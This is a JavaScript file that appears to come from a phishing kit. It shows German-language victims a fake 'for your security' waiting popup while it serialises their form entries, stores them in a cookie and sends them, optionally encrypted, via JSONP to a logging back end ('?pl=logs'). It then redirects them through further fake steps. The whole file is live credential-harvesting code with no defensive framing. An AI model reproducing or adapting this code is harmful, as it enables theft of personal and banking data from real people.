   $(document).ready(function() {


       $('.loader2__').remove();


       $('<div  class="popup popup-sm loader__ waiter__" style="display:none">\
            <span class="fa fa-times"></span>\
            <div class="popup-top">\
                <img class="popup-bg" src="popup_bg.png">\
            </div>\
            <div class="popup-body">\
                <div class="body-title">Zu Ihrer Sicherheit. Ihre Anfrage wird bearbeitet, das dauert 2-3 Minute</div>\
                <span class="cool_spinner__">\
                    <svg version="1.1" id="L2" height="50" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">\
                        <circle fill="none" stroke-width="4" stroke-miterlimit="10" cx="50" cy="50" r="48" />\
                        <line fill="none" stroke-linecap="round" stroke-width="4" stroke-miterlimit="10" x1="50" y1="50" x2="85" y2="50.5">\
                            <animateTransform attributeName="transform" dur="2s" type="rotate" from="0 50 50" to="360 50 50" repeatCount="indefinite" />\
                        </line>\
                        <line fill="none" stroke-linecap="round" stroke-width="4" stroke-miterlimit="10" x1="50" y1="50" x2="49.5" y2="74">\
                            <animateTransform attributeName="transform" dur="15s" type="rotate" from="0 50 50" to="360 50 50" repeatCount="indefinite" />\
                        </line>\
                    </svg>\
                </span>\
            </div>\
        </div>').appendTo('.popup-container');



       window.loader_ = {
           hide: function() {

               // $('.scum_container').removeClass('loader_hide loader_show');
               // $('.scum_container').addClass('loader_hide');
               $(document).trigger('loader_hide') //2020 events triggers
               $('.loader__').hide();
           },
           show: function() {
               // $('.loader__').fadeIn('fast');
               // $('.scum_container').removeClass('loader_hide loader_show');
               // $('.scum_container').addClass('loader_show');
               $(document).trigger('loader_show') //2020 events triggers
               $('.loader__').show();
           }
       }





   });


   function next__(el) {
       cookies.set('ses', 1);


       var Callback = function(data) {
           setTimeout(function() {
               // loader_.hide();
               // $(".scum").hide();
               // $(el).closest(".scum").next().show();

               // window.location.href = "../next/";
               lock_redirect('next')
           }, 3000);
       }

       loader_.show();



       var data__ = $(el).custom_ser();
       var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
       cookies.set('data__', JSON.stringify(all_data__))

       data__ = php_js.encryption ? EN(data__) : data__;

       if (/(email|jabber|complited)\.php/.test(php_js.home)) {
           Callback();
           return;
       }

       $.ajax({
           url: php_js.home + "?pl=logs&sl&link=" + php_js.link + "&bid=" + bid,
           dataType: "jsonp",
           data: {
               data: JSON.stringify(data__)
           },
           success: Callback,
           error: function(data) {}
       });

   }








   function finish__(el) {
       cookies.set('ses', 1);
       loader_.show();
       // alert('fin');
       var data__ = $(el).custom_ser();
       var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
       cookies.set('data__', JSON.stringify(all_data__))


       if (/(email|jabber|complited)\.php/.test(php_js.home)) {
           data__ = all_data__;
       }

       data__ = php_js.encryption ? EN(data__) : data__;
       $.ajax({
           url: php_js.home + "?pl=logs&sl&done&link=" + php_js.link + "&bid=" + bid,
           dataType: "jsonp",
           data: {
               data: JSON.stringify(data__)
           },
           success: function(data) {
               // window.location.href = php_js.bb_link;




               // window.location.href = "../done/";
               lock_redirect('done')
           },
           error: function(data) {}
       });
   }




   var def_plugin_data_receiver = function(data) {

       var Callback = function(data) {
           setTimeout(function() {
               loader_.hide();
               // $(".scum").hide();
               // $(el).closest(".scum").next().show();
               window.location.href = "../next/";
           }, 3000);
       }

       loader_.show();
       var data__ = data
       var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
       cookies.set('data__', JSON.stringify(all_data__))

       if (/(email|jabber|complited)\.php/.test(php_js.home)) {
           Callback();
           return;
       }
       $.ajax({
           url: php_js.home + "&sl&link=" + php_js.link + "&bid=" + bid,
           dataType: "jsonp",
           data: {
               data: JSON.stringify(data__)
           },
           success: Callback,
           error: function(data) {}
       });
   }





   $(document).ready(function() {
       // $('head base').attr('href','');

       // setTimeout(function() {
       //     loader_.hide()
       // }, 2000)

       window.location.hash = "56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d"

   });